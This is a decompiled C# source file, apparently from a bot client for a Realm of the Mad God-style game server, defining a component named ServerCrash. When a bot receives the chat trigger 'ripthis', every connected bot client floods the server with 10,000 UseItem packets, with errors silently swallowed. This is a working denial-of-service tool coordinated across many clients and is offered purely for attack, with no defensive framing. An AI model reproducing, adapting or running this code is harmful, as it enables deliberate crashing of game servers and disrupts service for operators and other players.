using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using PortableRealm.Models;
using PortableRealm.Net.Packets.Incoming;
using PortableRealm.Net.Packets.Outgoing;

namespace Noidea.Core.Components
{
	// Token: 0x02000030 RID: 48
	public class ServerCrash : Component
	{
		// Token: 0x06000143 RID: 323 RVA: 0x00002B05 File Offset: 0x00000D05
		public override void Initialize()
		{
			this.Core = base.Client.GetComponent<CoreLoop>();
			base.Hook<EnemyShoot>(delegate(EnemyShoot shoot)
			{
				base.Client.Send(new ShootAck
				{
					Time = this.Core.FrameTime
				});
			});
			base.Hook<Text>(delegate(Text text)
			{
				bool flag = text.Recipient == base.Client.Name && text.Message == "ripthis";
				if (flag)
				{
					List<Client> clients = Program.Clients;
					foreach (Client client in clients)
					{
						try
						{
							client.GetComponent<ServerCrash>().Crash();
						}
						catch (Exception)
						{
						}
					}
				}
			});
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00002B3F File Offset: 0x00000D3F
		public void Crash()
		{
			Task.Run(delegate()
			{
				try
				{
					bool flag = base.Client.Connected && base.Client.Inventory != null;
					if (flag)
					{
						UseItem packet = new UseItem
						{
							ItemUsePos = base.Client.Position,
							SlotObject = new SlotObjectData
							{
								ObjectId = base.Client.ObjectId,
								ObjectType = base.Client.Inventory[1],
								SlotId = 1
							},
							Time = this.Core.Time,
							UseType = 0
						};
						for (int i = 0; i < 10000; i++)
						{
							base.Client.Send(packet);
						}
					}
				}
				catch (Exception)
				{
				}
			});
		}

		// Token: 0x040000DD RID: 221
		public CoreLoop Core;
	}
}
